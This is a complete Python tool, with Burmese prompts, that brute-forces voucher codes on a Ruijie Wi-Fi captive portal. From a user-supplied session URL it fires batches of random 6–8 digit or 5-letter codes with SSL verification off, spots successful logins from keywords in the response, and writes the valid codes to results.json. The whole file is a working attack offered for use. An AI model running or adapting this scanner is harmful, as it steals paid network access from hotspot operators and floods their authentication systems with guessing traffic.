import asyncio
import json
import os
import random
import string
import time
import aiohttp

RESULT_PATH = "results.json"

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return default

def save_json(path, data):
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def save_found_code(code_info):
    results = load_json(RESULT_PATH, [])
    if not any(item["code"] == code_info["code"] for item in results):
        results.append(code_info)
        save_json(RESULT_PATH, results)

def generate_code(mode):
    if mode == "1":
        return ''.join(random.choices(string.digits, k=6))
    elif mode == "2":
        return ''.join(random.choices(string.digits, k=7))
    elif mode == "3":
        return ''.join(random.choices(string.digits, k=8))
    elif mode == "4":
        return ''.join(random.choices(string.ascii_lowercase, k=5))
    else:
        return ''.join(random.choices(string.digits, k=6))

async def check_and_update(session, session_url, code, found_list, stats):
    test_url = f"{session_url}&voucherCode={code}" if "?" in session_url else f"{session_url}?voucherCode={code}"
    try:
        async with session.get(test_url, timeout=5) as resp:
            res_text = await resp.text()
            res_lower = res_text.lower()
            has_error = any(k in res_lower for k in ["invalid", "fail", "wrong", "error", "expired", "incorrect", "မမှန်ကန်"])
            if resp.status == 200 and not has_error:
                if any(k in res_lower for k in ["success", "auth_ok", "welcome", "successful"]):
                    code_info = {"code": code, "time": "3hr", "found_timestamp": time.time()}
                    if not any(item["code"] == code for item in found_list):
                        found_list.append(code_info)
                        save_found_code(code_info)
                        print(f"\n🎉 Success Code တွေ့ရှိပါပြီ! Code: {code}")
            else:
                stats["retry"] += 1
    except Exception:
        stats["retry"] += 1

async def main():
    print("="*40)
    print(" Ruijie Voucher Terminal Scanner ")
    print("="*40)
    
    session_url = input("🔗 Ruijie Session URL ထည့်ပါ: ").strip()
    if not session_url:
        print("⚠️ URL မထည့်ရသေးပါ။")
        return
        
    print("\n🎛️ Scan Mode ရွေးချယ်ပါ:")
    print("1. 6-digit (ဂဏန်း 6 လုံး)")
    print("2. 7-digit (ဂဏန်း 7 လုံး)")
    print("3. 8-digit (ဂဏန်း 8 လုံး)")
    print("4. ascii-lower (စာလုံးသေး 5 လုံး)")
    mode_choice = input("ရွေးချယ်မှုနံပါတ် (1-4 ကိုနှိပ်ပါ): ").strip()
    
    stats = {"checked": 0, "retry": 0}
    found_list = []
    total_target = 10000000
    start_time = time.time()
    
    print("\n🚀 Scan စတင်နေပါပြီ... (ရပ်တန့်ရန် Ctrl+C နှိပ်ပါ)\n")
    
    connector = aiohttp.TCPConnector(ssl=False, limit=500)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5)) as session:
        try:
            while True:
                batch_size = 20
                tasks = []
                for _ in range(batch_size):
                    code = generate_code(mode_choice)
                    stats["checked"] += 1
                    tasks.append(check_and_update(session, session_url, code, found_list, stats))
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                elapsed = time.time() - start_time
                speed = int(stats["checked"] / (elapsed / 60)) if elapsed > 0 else 0
                progress = min(100.0, (stats["checked"] / total_target) * 100)
                
                print(f"\r📦 Checked: {stats['checked']:,} | 📊 Progress: {progress:.2f}% | ⚡ Speed: {speed} c/m | ✅ Found: {len(found_list)} | 🔄 Retry: {stats['retry']}", end="", flush=True)
                
                await asyncio.sleep(0.3)
        except KeyboardInterrupt:
            print(f"\n\n⏹️ Scan ကို ရပ်တန့်လိုက်ပါပြီ။ တွေ့ရှိထားသော ကုဒ်များကို {RESULT_PATH} တွင် သိမ်းဆည်းထားသည်။")

if __name__ == "__main__":
    asyncio.run(main())
